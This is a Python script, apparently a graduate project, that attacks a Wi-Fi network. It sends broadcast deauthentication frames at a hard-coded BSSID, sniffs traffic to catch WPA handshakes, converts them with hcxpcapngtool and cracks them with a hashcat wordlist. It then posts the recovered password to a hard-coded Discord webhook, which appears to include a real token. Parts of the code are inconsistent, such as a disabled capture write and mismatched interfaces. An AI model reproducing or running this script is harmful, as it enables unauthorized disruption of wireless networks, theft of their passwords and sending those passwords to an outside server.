# Define the command
import subprocess
import shutil
import os
import json
from scapy.all import *
from scapy.layers.dot11 import Dot11,RadioTap , Dot11Deauth
import requests
# Define the paths
pcap_file = 'hana.pcap'
output_file = 'output.hc22000'
destination_path = 'Desktop/grad/output.hccapx'

# Function to deauthenticate network
def deauthenticate_network(bssid):
    pkt = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=bssid, addr3=bssid) / Dot11Deauth()
    sendp(pkt, iface="wlan0", count=5, inter=0.1, verbose=True)

# Function to handle packets
def packet_handler(pkt):
    # Capture all packets without filtering
    handshakes.append(pkt)  # Store the entire packet
    print("Packet captured:", pkt.summary())

# List to store network data and captured handshakes
networks = []
handshakes = []

# Set Wi-Fi interface to monitor mode
os.system("sudo iwconfig wlan0 mode monitor")

# Deauthenticate network
deauthenticate_network(bssid="AC:64:62:8E:23:90")

# Sniff Wi-Fi packets
sniff(iface="wlan1", prn=packet_handler, timeout=60)

# Write captured handshakes to a pcap file
#######wrpcap(pcap_file, handshakes)
#######print("Captured handshakes saved to", pcap_file)

# Write network data to JSON file
with open("network_data.json", "a") as json_file:
    json.dump(networks, json_file, indent=4)
print("Network data saved to network_data.json")
 
# Define the command
os.system(f'hcxpcapngtool -o {output_file} {pcap_file}')

#os.system(f'hashcat -m 22000 -a 0 {output_file} li.txt')

def crack_password(hash_file, wordlist_file, webhook_url):
    # Run hashcat command and capture the output
    result = os.popen(f'hashcat -m 22000 -a 0 {output_file} li.txt').read()

    # Check if "All hashes found" message is in the result
    if "All hashes found" not in result:
        # Extract password from hashcat output
        password = result.split(" ")[-1].strip()
        # Notify with the password
        notify_discord(webhook_url, password)
    else:
        # Notify that no password was found
        notify_discord(webhook_url, "No password found.")

def notify_discord(webhook_url, message):
    # JSON payload for the Discord webhook
    payload = {
        "content": message
    }
    try:
        # Send POST request to Discord webhook
        response = requests.post(webhook_url, json=payload)
        # Check if request was successful
        if response.status_code == 200:
            print("Notification sent successfully.")
        else:
            print(f"Failed to send notification. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred: {e}")


# Replace 'YOUR_WEBHOOK_URL' with your actual Discord webhook URL
webhook_url = 'https://discord.com/api/webhooks/1240023992585420921/ACX2G_SzjQ2_M7nLatYSSWNisqMlssUjBmfgh42bsVbR-jswV2V-KFpqSW4BFaJ4PfV0'

# Usage
crack_password("output.hc22000", "li.txt", webhook_url)

